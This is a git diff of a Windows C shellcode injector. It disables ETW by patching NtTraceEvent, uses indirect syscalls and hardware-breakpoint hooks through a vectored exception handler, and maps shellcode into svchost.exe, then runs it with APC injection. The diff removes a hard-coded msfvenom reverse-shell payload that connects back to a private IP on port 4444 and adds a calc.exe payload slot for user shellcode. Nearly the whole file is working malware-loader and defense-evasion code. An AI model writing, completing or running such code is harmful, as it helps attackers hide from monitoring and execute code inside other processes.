@@ -4,11 +4,83 @@
 #include <winternl.h>
 #include <ntstatus.h>
 #include <TlHelp32.h>
+#include <stdint.h>
+#include <winuser.h>
 #include "Sympho.h"
 #include "HellsHall.h"
 
+
+// Global Variable :
 NTSTATUS STATUS;
 #define ViewShare 1
+HANDLE hSection = NULL;
+HANDLE hThread = NULL;
+BYTE* pBaseSection = NULL;
+DWORD PID = NULL;
+HANDLE hProcess = NULL;
+HANDLE hMap = NULL;
+PVOID localBase = NULL;
+PVOID remoteBase = NULL;
+SIZE_T viewSize = NULL;
+HANDLE hSnapshot = NULL;
+
+typedef enum ETWfunc {
+	vETWEventWrite,
+	vETWEventWriteFull
+};
+// End of Global Variable
+
+
+
+// HardwareBP variable :
+VOID SetFunctionArgument(IN PCONTEXT pThreadCtx, IN ULONG_PTR uValue, IN DWORD dwParmIndex);
+CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
+
+#define CONTINUE_EXECUTION(CTX) (CTX->EFlags |= (1 << 16))
+
+#define SETPARM_1(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x1))
+#define SETPARM_2(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x2))
+#define SETPARM_3(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x3))
+#define SETPARM_4(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x4))
+#define SETPARM_5(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x5))
+#define SETPARM_6(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x6))
+#define SETPARM_7(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x7))
+#define SETPARM_8(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x8))
+#define SETPARM_9(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x9))
+#define SETPARM_A(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0xA))
+#define SETPARM_B(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0xB))
+
+#ifdef _WIN64
+#define RETURN_VALUE(CTX, VALUE)((ULONG_PTR)CTX->Rax = (ULONG_PTR)VALUE)
+#elif _WIN32
+#define RETURN_VALUE(CTX, VALUE)((ULONG_PTR)CTX->Eax = (ULONG_PTR)VALUE)
+#endif // _WIN64
+
+
+#pragma section(".text")
+__declspec(allocate(".text")) const unsigned char ucRet[] = { 0xC3 };
+
+// Called in the detour function to block the execution of the original hooked function
+VOID BLOCK_REAL(IN PCONTEXT pThreadCtx) {
+#ifdef _WIN64
+	pThreadCtx->Rip = (ULONG_PTR)&ucRet;
+#elif _WIN32
+	pThreadCtx->Eip = (DWORD)&ucRet;
+#endif // _WIN64
+}
+
+// End of Hardware BreakPoint variable
+
+enum DRX {
+	DR0,
+	DR1,
+	DR2,
+	DR3
+};
+
+enum DRX Dr0 = DR0;
+enum DRX Dr1 = DR1;
+enum DRX Dr2 = DR2;
 
 typedef struct _MyStruct
 {
@@ -19,10 +91,16 @@ typedef struct _MyStruct
 	SysFunc NtQuerySystemInformation;
 	SysFunc RtlAllocateHeap;
 	SysFunc NtOpenProcess;
+	SysFunc NtProtectVirtualMemory;
+	SysFunc NtSuspendThread;
+	SysFunc NtGetContextThread;
+	SysFunc NtSetContextThread;
+	SysFunc NtResumeThread;
 } MyStruct, * PMyStruct;
 
 MyStruct S = { 0 };
 PSYSTEM_PROCESS_INFORMATION sProcInfo = NULL;
+
 
 BOOL Initialize() {
 
@@ -70,121 +148,161 @@ BOOL Initialize() {
 	}
 	getSysFuncStruct(&S.NtOpenProcess);
 
+	if (!InitilizeSysFunc("NtSuspendThread")) {
+		printf("Issues while initializing function\n");
+		return FALSE;
+	}
+	getSysFuncStruct(&S.NtSuspendThread);
+
+	if (!InitilizeSysFunc("NtGetContextThread")) {
+		printf("Issues while initializing function\n");
+		return FALSE;
+	}
+	getSysFuncStruct(&S.NtGetContextThread);
+
+	if (!InitilizeSysFunc("NtSetContextThread")) {
+		printf("Issues while initializing function\n");
+		return FALSE;
+	}
+	getSysFuncStruct(&S.NtSetContextThread);
+
+	if (!InitilizeSysFunc("NtResumeThread")) {
+		printf("Issues while initializing function\n");
+		return FALSE;
+	}
+	getSysFuncStruct(&S.NtResumeThread);
+
+	if (!InitilizeSysFunc("NtProtectVirtualMemory")) {
+		printf("Issues while initializing function\n");
+		return FALSE;
+	}
+	getSysFuncStruct(&S.NtProtectVirtualMemory);
+
+	return TRUE;
+}
+#define RET_OPCODE 0xC3
+#define MOVE_EAX_imm32_OPCODE 0xB8
+
+BOOL RemoveETWEvent(HMODULE hModule) {
+	DWORD dwOldProtection = 0;
+
+	printf("[i] Shuting Down ETW provision\n");
+	PBYTE pNtTraceEvent = (PBYTE)GetProcAddress(hModule, "NtTraceEvent");
+	if (!pNtTraceEvent)
+		return FALSE;
+
+	// Cherche le SSN
+	for (int i = 0; i < 0x20; i++) {
+		if (pNtTraceEvent[i] == MOVE_EAX_imm32_OPCODE) {
+			pNtTraceEvent = &pNtTraceEvent[i + 1];
+			break;
+		}
+		if (pNtTraceEvent[i] == RET_OPCODE || pNtTraceEvent[i] == 0x0F || pNtTraceEvent[i] == 0x05)
+			return FALSE;
+	}
+
+	void* pvoidNtTraceEvent = (void*)pNtTraceEvent; // <- ici après GetProcAddress
+	UINT sizet = sizeof(DWORD);
+
+	SYSCALL(S.NtProtectVirtualMemory);
+	if (!VirtualProtect(pNtTraceEvent, sizet, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+		printf("[!] VirtualProtect failed with error %d\n", GetLastError());
+		return FALSE;
+	}
+
+	*(PDWORD)pNtTraceEvent = 0x000000FF; // Patch
+
+	// Remet les permissions initiales
+	if (!VirtualProtect(pNtTraceEvent, sizeof(DWORD), dwOldProtection, &dwOldProtection)) {
+		printf("[!] VirtualProtect failed with error %d\n", GetLastError());
+		return FALSE;
+	}
+	printf("[+] DONE\n");
 	return TRUE;
 }
 
+
 HANDLE GiveMeMyProcessHandle(WCHAR* ProcessName, OUT int* PID) {
-	int pPID = 0;
-	ULONG sProcInfoL = 0;
+	PSYSTEM_PROCESS_INFORMATION entry = sProcInfo;  // pointeur local
 	HANDLE hPID = NULL;
-	OBJECT_ATTRIBUTES objstruct = { sizeof(objstruct) };
-	CLIENT_ID clientId;
+	NTSTATUS status;
+	OBJECT_ATTRIBUTES objAttr;
+	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
+	while (entry->NextEntryOffset) {
+		if (entry->ImageName.Buffer &&
+			wcscmp(entry->ImageName.Buffer, ProcessName) == 0) {
 
-	// Loop through the processes
-	while (sProcInfo->NextEntryOffset != 0) {
-		if (sProcInfo->ImageName.Buffer != NULL) {
-			if (wcscmp(sProcInfo->ImageName.Buffer, ProcessName) == 0) {
-				pPID = sProcInfo->UniqueProcessId;
+			int localPID = (int)(ULONG_PTR)entry->UniqueProcessId;
+			CLIENT_ID clientId = {
+				.UniqueProcess = (HANDLE)(ULONG_PTR)localPID,
+				.UniqueThread = NULL
+			};
 
-				// Attempt to open the process using NtOpenProcess
-				clientId.UniqueProcess = (HANDLE)pPID;
-				clientId.UniqueThread = NULL;
+			const ACCESS_MASK desired = PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION;
 
-				SYSCALL(S.NtOpenProcess);
-				if ((STATUS = HellHall(&hPID, PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, &objstruct, &clientId)) == 0) {
-					// Successfully opened the process
-					printf("[+] Found and successfully opened PID: %d\n", pPID);
-					printf("Process handle at 0x%02X\n", hPID);
-					*PID = pPID;
-					return hPID;
-				}
+			SYSCALL(S.NtOpenProcess);
+			status = HellHall(&hPID, desired, &objAttr, &clientId);
+
+
+			if (status == STATUS_SUCCESS && hPID) {
+				*PID = localPID;
+				printf("[+] Opened \"%ls\" PID=%d, handle=%p\n",
+					ProcessName, *PID, hPID);
+				return hPID;
 			}
 		}
-		sProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)sProcInfo + sProcInfo->NextEntryOffset);
+
+		entry = (PSYSTEM_PROCESS_INFORMATION)
+			((BYTE*)entry + entry->NextEntryOffset);
 	}
-	return NULL; // No valid handle found
+	getchar();
+	return NULL;
 }
 
-BOOL SettingMap(HANDLE* outSection, PVOID* outRemoteBase, HANDLE hProcess) {
-#include <stdint.h>
+BOOL SettingMap(HANDLE* outSection, BYTE* outRemoteBase, HANDLE hProcess) {
+
+	printf("[i] MessageBoxA hooked successfuly\n");
 
 	// Put your msfvenom shellcode here !
 	uint8_t payload[] = {
-		 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00,
-	0x41, 0x51, 0x41, 0x50, 0x52, 0x48, 0x31, 0xd2, 0x65, 0x48,
-	0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x51, 0x56, 0x48,
-	0x8b, 0x52, 0x20, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x8b,
-	0x72, 0x50, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
-	0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
-	0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
-	0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78,
-	0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b,
-	0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67,
-	0x48, 0x01, 0xd0, 0x44, 0x8b, 0x40, 0x20, 0x8b, 0x48, 0x18,
-	0x49, 0x01, 0xd0, 0x50, 0xe3, 0x56, 0x4d, 0x31, 0xc9, 0x48,
-	0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48,
-	0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1,
-	0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
-	0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49,
-	0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40,
-	0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
-	0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58,
-	0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52,
-	0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
-	0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32,
-	0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6,
-	0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5,
-	0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x32, 0x72,
-	0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba,
-	0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68,
-	0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b,
-	0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x41, 0x5e, 0x50, 0x50, 0x4d,
-	0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89,
-	0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea,
-	0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10,
-	0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba,
-	0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0a,
-	0x49, 0xff, 0xce, 0x75, 0xe5, 0xe8, 0x93, 0x00, 0x00, 0x00,
-	0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9,
-	0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02,
-	0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x55,
-	0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41,
-	0x59, 0x68, 0x00, 0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89,
-	0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5,
-	0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31,
-	0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9,
-	0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8,
-	0x00, 0x7d, 0x28, 0x58, 0x41, 0x57, 0x59, 0x68, 0x00, 0x40,
-	0x00, 0x00, 0x41, 0x58, 0x6a, 0x00, 0x5a, 0x41, 0xba, 0x0b,
-	0x2f, 0x0f, 0x30, 0xff, 0xd5, 0x57, 0x59, 0x41, 0xba, 0x75,
-	0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x49, 0xff, 0xce, 0xe9, 0x3c,
-	0xff, 0xff, 0xff, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48,
-	0x85, 0xf6, 0x75, 0xb4, 0x41, 0xff, 0xe7, 0x58, 0x6a, 0x00,
-	0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5
+		 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
+	0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,
+	0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
+	0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,
+	0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,
+	0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,
+	0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,
+	0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
+	0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
+	0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,
+	0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,
+	0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
+	0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,
+	0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,
+	0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
+	0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
+	0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,
+	0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,
+	0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,
+	0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00
 	};
 
-	HANDLE hMap = NULL;
-	PVOID localBase = NULL;
-	PVOID remoteBase = NULL;
 	SIZE_T sPayload = sizeof(payload);
-	SIZE_T viewSize = NULL;
 	LARGE_INTEGER maxSize = { .HighPart = 0, .LowPart = sPayload };
-
-
 	SYSCALL(S.NtCreateSection);
 	if ((STATUS = HellHall(&hMap, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
 		printf("[!] Issue creating the section\n");
 		return FALSE;
 	}
 	printf("[+] Section created\n");
-
 	SYSCALL(S.NtMapViewOfSection);
 	if ((STATUS = HellHall(hMap, GetCurrentProcess(), &localBase, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
-		printf("Issue while mapping view locally\n");
 		printf("NtMapViewOfSection failed with status: 0x%X\n", STATUS);
 		return FALSE;
 	}
-
+	else {
+		printf("[i] NtmapViewofsection mapped locally\n");
+	}
 
 	if (hMap != NULL) {
 		*outSection = hMap;
@@ -199,30 +317,210 @@ BOOL SettingMap(HANDLE* outSection, PVOID* outRemoteBase, HANDLE hProcess) {
 	}
 
 	memcpy(localBase, payload, sizeof(payload));
-
-	if ((STATUS = HellHall(hMap, hProcess, (PVOID*)&remoteBase, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE)) != 0) {
-		printf("Issue while mapping view remotely\n");
+	viewSize = sPayload;
+	if ((STATUS = HellHall(hMap, hProcess, &remoteBase, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY)) != 0) {
+		printf("[-] Issue while mapping view remotely. NTSTATUS: 0x%08X\n", STATUS);
 		return FALSE;
 	}
 	else {
 		printf("File Mapped succesfuly with remote process at 0x%p\n", remoteBase);
-		*outRemoteBase = remoteBase;
-		return TRUE;
+		outRemoteBase = &remoteBase;
 	}
+	Sleep(100);
+	HellHall(hMap, hProcess, &remoteBase, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_WRITECOPY);
+	printf("[+] Remote protection set ok\n");
+	return TRUE;
+}
+
+
+
+
+/*
+Set Hardware BP
+*/
+
+uint64_t SetDr7Bits(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, uint64_t NewBitValue) {
+	uint64_t mask = (1UL << NmbrOfBitsToModify) - 1UL;
+	uint64_t NewDr7Register = (CurrentDr7Register & ~(mask << StartingBitPosition)) | (NewBitValue << StartingBitPosition);
+
+	return NewDr7Register;
+}
+
+BOOL SetHardwareBreakingPnt(IN PVOID pAddress, IN PVOID fnHookFunc, IN enum DRX Drx) {
+
+	if (!pAddress || !fnHookFunc)
+		return FALSE;
+
+	// Get local thread context
+	if (!GetThreadContext((HANDLE)-2, &ThreadCtx)) // -2 pour spécifier le thread local
+		return FALSE;
+
+	// Sets the value of the Dr0-3 registers 
+	switch (Drx) {
+	case DR0: {
+		if (!ThreadCtx.Dr0)
+			ThreadCtx.Dr0 = pAddress;
+		break;
+	}
+	case DR1: {
+		if (!ThreadCtx.Dr1)
+			ThreadCtx.Dr1 = pAddress;
+		break;
+	}
+	case DR2: {
+		if (!ThreadCtx.Dr2)
+			ThreadCtx.Dr2 = pAddress;
+		break;
+	}
+	case DR3: {
+		if (!ThreadCtx.Dr3)
+			ThreadCtx.Dr3 = pAddress;
+		break;
+	}
+	default:
+		return FALSE;
+	}
+
+	// enabling Breakpoints
+	// SetDr7Bits(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, unsigned long long NewBitValue);=
+	ThreadCtx.Dr7 = SetDr7Bits(ThreadCtx.Dr7, (Drx * 2), 1, 1);
+
+	// Set the thread context
+	if (!SetThreadContext((HANDLE)-2, &ThreadCtx))
+		return FALSE;
 
 	return TRUE;
 }
 
+
+
+BOOL RemoveHardwareBreakingPnt(IN enum DRX Drx) {
+
+	CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
+
+	if (!GetThreadContext((HANDLE)-2, &ThreadCtx))
+		return FALSE;
+
+	// Remove the address of the hooked function from the thread context
+	switch (Drx) {
+	case DR0: {
+		ThreadCtx.Dr0 = 0x00;
+		break;
+	}
+	case DR1: {
+		ThreadCtx.Dr1 = 0x00;
+		break;
+	}
+	case DR2: {
+		ThreadCtx.Dr2 = 0x00;
+		break;
+	}
+	case DR3: {
+		ThreadCtx.Dr3 = 0x00;
+		break;
+	}
+	default:
+		return FALSE;
+	}
+
+	// Disabling the hardware breakpoint by setting the target G0-3 flag to zero 
+	ThreadCtx.Dr7 = SetDr7Bits(ThreadCtx.Dr7, (Drx * 2), 1, 0);
+
+	if (!SetThreadContext((HANDLE)-2, &ThreadCtx))
+		return FALSE;
+
+	return TRUE;
+}
+
+
+
+
+// VEH Function
+LONG WINAPI VectorHandler(PEXCEPTION_POINTERS pExceptionInfo) {
+	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+		PVOID exceptionAddress = pExceptionInfo->ExceptionRecord->ExceptionAddress;
+		PCONTEXT ctx = pExceptionInfo->ContextRecord;
+		enum DRX triggered = -1;
+
+		// On détecte quel DRx a sauté
+		if (exceptionAddress == (PVOID)ctx->Dr0) triggered = DR0;
+		else if (exceptionAddress == (PVOID)ctx->Dr1) triggered = DR1;
+		else if (exceptionAddress == (PVOID)ctx->Dr2) triggered = DR2;
+		else if (exceptionAddress == (PVOID)ctx->Dr3) triggered = DR3;
+
+		if (triggered >= DR0 && triggered <= DR2) {
+			// Désactive le HW BP pour éviter la récursion
+			RemoveHardwareBreakingPnt(triggered);
+
+			switch (triggered) {
+			case DR0:
+				//-----------------------------
+				// Mapping de la section
+				//-----------------------------
+				// RCX = &hSection
+				// RDX = &pBaseSection
+				// R8  = hProcess (ton handle valide)
+				ctx->Rcx = (ULONG_PTR)&hSection;
+				ctx->Rdx = (ULONG_PTR)&pBaseSection;
+				ctx->R8 = (ULONG_PTR)hProcess;
+				// Appel en C
+				if (!SettingMap(&hSection, &pBaseSection, hProcess))
+					RETURN_VALUE(ctx, FALSE);
+				else
+					RETURN_VALUE(ctx, TRUE);
+				break;
+
+			case DR1:
+				//-----------------------------
+				// Queue APC sur un thread alerte
+				//-----------------------------
+				// RCX = PID
+				// RDX = pBaseSection
+				ctx->Rcx = (ULONG_PTR)PID;
+				ctx->Rdx = (ULONG_PTR)pBaseSection;
+				if (!QueueShellcodeAPC((DWORD)PID, pBaseSection))
+					RETURN_VALUE(ctx, FALSE);
+				else
+					RETURN_VALUE(ctx, TRUE);
+				break;
+
+			case DR2:
+				//-----------------------------
+				// Injecter manuellement via SleepEx APC
+				//-----------------------------
+				// RCX = hProcess
+				// RDX = pBaseSection
+				ctx->Rcx = (ULONG_PTR)hProcess;
+				ctx->Rdx = (ULONG_PTR)pBaseSection;
+				if (!InjectShellcodeAPCmanually(hProcess, pBaseSection))
+					RETURN_VALUE(ctx, FALSE);
+				else
+					RETURN_VALUE(ctx, TRUE);
+				break;
+			}
+
+			// on saute l’instruction d’origine et on retourne
+			BLOCK_REAL(ctx);
+			return EXCEPTION_CONTINUE_EXECUTION;
+		}
+	}
+	return EXCEPTION_CONTINUE_SEARCH;
+}
+
+
+volatile BOOL executed = FALSE;
+BOOL* pExecuted;
 VOID CALLBACK DummyAPCFunc(ULONG_PTR param) {
-	BOOL* pExecuted = (BOOL*)param;
+	pExecuted = (BOOL*)param;
 	*pExecuted = TRUE;
 }
 
+
 BOOL QueueShellcodeAPC(DWORD dwPID, PVOID pRemoteShellcode) {
 
+	printf("[i] MessageBoxW hooked successfuly\n");
 	int i = 0;
-	volatile BOOL executed = FALSE;
-	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwPID);
 	if (hSnapshot == INVALID_HANDLE_VALUE) {
 		printf("[!] Snapshot failed.\n");
 		return FALSE;
@@ -237,92 +535,95 @@ BOOL QueueShellcodeAPC(DWORD dwPID, PVOID pRemoteShellcode) {
 	}
 	do {
 		if (te32.th32OwnerProcessID == dwPID) {
-			HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);
+			hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);
 			if (hThread) {
 				// Trying the injection
 				DWORD res = QueueUserAPC((PAPCFUNC)pRemoteShellcode, hThread, (ULONG_PTR)NULL);
-				DWORD res2 = QueueUserAPC(DummyAPCFunc, hThread, (ULONG_PTR)&executed);
 				if (res != 0) {
 					printf("[+] APC queued on thread %lu\n", te32.th32ThreadID);
-					i += 1;
-				}
-				if (res2 != 0) {
-					printf("[+] DummyAPCFunc on thread %lu\n", te32.th32ThreadID);
-					CloseHandle(hThread);
 					break;
 				}
 
 			}
 		}
 	} while (Thread32Next(hSnapshot, &te32));
-	CloseHandle(hSnapshot);
+	int x = 0;
 	if (i == 0) {
 		return FALSE;
 	}
-	else {
-		Sleep(1000);
+	do {
+		Sleep(100);
 		if (executed) {
 			printf("[+] DummyAPCFunc executed successfully.\n");
+			CloseHandle(hSnapshot);
 			return TRUE;
 		}
-		else {
+		else if (x == 9) {
 			printf("[-] DummyAPCFunc was not executed.\n");
 			return FALSE;
 		}
-	}
+		else {
+			x++;
+		}
+	} while (x < 10);
+
+	CloseHandle(hSnapshot);
 	return TRUE;
+}
+
+void MySleepEx() {
+	SleepEx(1000, TRUE);
+}
+
+void MySleepThread() {
+	while (1) {
+		SleepEx(INFINITE, TRUE); // alertable sleep
+	}
 }
 
 BOOL InjectShellcodeAPCmanually(HANDLE hProcess, PVOID pBaseSection) {
-	HANDLE hThread = NULL;
-	DWORD threadId = 0;
-
-	hThread = CreateRemoteThread(
-		hProcess,
-		NULL,
-		0,
-		(LPTHREAD_START_ROUTINE)SleepEx,  // SleepEx(INFINITE, TRUE)
-		(LPVOID)(TRUE),
-		CREATE_SUSPENDED,
-		&threadId
-	);
-
-	if (hThread == NULL) {
-		printf("[!] Failed to create remote thread (SleepEx)\n");
-		CloseHandle(hProcess);
-		return FALSE;
+	HANDLE hLocalTread = NULL;
+	ULONG PreviousSuspendCount;
+	printf("Before LOCAL APC injection\n");
+	SYSCALL(S.NtCreateThreadEx);
+	if ((STATUS = (HellHall(&hLocalTread, THREAD_ALL_ACCESS, 0, (HANDLE)-1, MySleepThread, 0, 0x00000001, 0, 0, 0, 0))) != 0) {
+		printf("[-] failed to create local thread\n");
 	}
 
-	printf("[+] Suspended thread created with TID: %lu\n", threadId);
-
-	if (QueueUserAPC((PAPCFUNC)pBaseSection, hThread, NULL) == 0) {
-		printf("[!] Failed to queue APC\n");
-		CloseHandle(hThread);
-		return FALSE;
+	BOOL res = QueueUserAPC((PAPCFUNC)localBase, hLocalTread, (ULONG_PTR)NULL);
+	if (res != 0) {
+		printf("[+] APC queued on newly created thread id : %d\n", GetThreadId(hLocalTread));
+	}
+	else {
+		printf("Error\n");
+		return(FALSE);
 	}
 
-	printf("[+] APC queued successfully on thread %lu\n", threadId);
-
-	if (ResumeThread(hThread) == (DWORD)-1) {
-		printf("[!] Failed to resume thread\n");
-		CloseHandle(hThread);
-		return FALSE;
+	SYSCALL(S.NtResumeThread);
+	if ((STATUS = (HellHall(hLocalTread, &PreviousSuspendCount))) != 0) {
+		printf("Error while resuming newly thread\n");
+		return(FALSE);
 	}
 
-	printf("[+] Thread resumed, shellcode should execute now.\n");
 
-	CloseHandle(hThread);
+
+
 	return TRUE;
 }
+
 
 
 int main() {
 	uint64_t expectedHash = 0x9B90848C8B008677; // NTDLL.DLL
 	HMODULE hModule = GiveMeMyModule(expectedHash);
-	HANDLE hSection = NULL;
-	HANDLE hThread = NULL;
-	PVOID pBaseSection = NULL;
-	int PID = NULL;
+
+	if (!RemoveETWEvent(hModule)) {
+		printf("[-] Error while patching ETW functions\n");
+		exit(0);
+	}
+
+	AddVectoredExceptionHandler(1, VectorHandler);
+
 
 	if (!hModule) {
 		printf("Error Getting NTDLL\n");
@@ -337,7 +638,19 @@ int main() {
 		return -1;
 	}
 
+	// Remove ETW 
+
+
 	ULONG sProcInfoL = 0;
+
+	/*
+	Set Hardware BP
+	*/
+	if (!SetHardwareBreakingPnt(MessageBoxA, SettingMap, Dr0) || !SetHardwareBreakingPnt(MessageBoxW, QueueShellcodeAPC, Dr1) || !SetHardwareBreakingPnt(DrawTextA, InjectShellcodeAPCmanually, Dr2)) {
+		printf("Error while Initializing HardwareBP\n");
+		exit(-1);
+	}
+
 
 	// Get system information (process list)
 	SYSCALL(S.NtQuerySystemInformation);
@@ -365,10 +678,10 @@ int main() {
 	}
 
 	// Try to open svchost.exe first
-	HANDLE hProcess = GiveMeMyProcessHandle(L"svchost.exe", &PID);
+	hProcess = GiveMeMyProcessHandle(L"svchost.exe", &PID);
 	if (hProcess == NULL) {
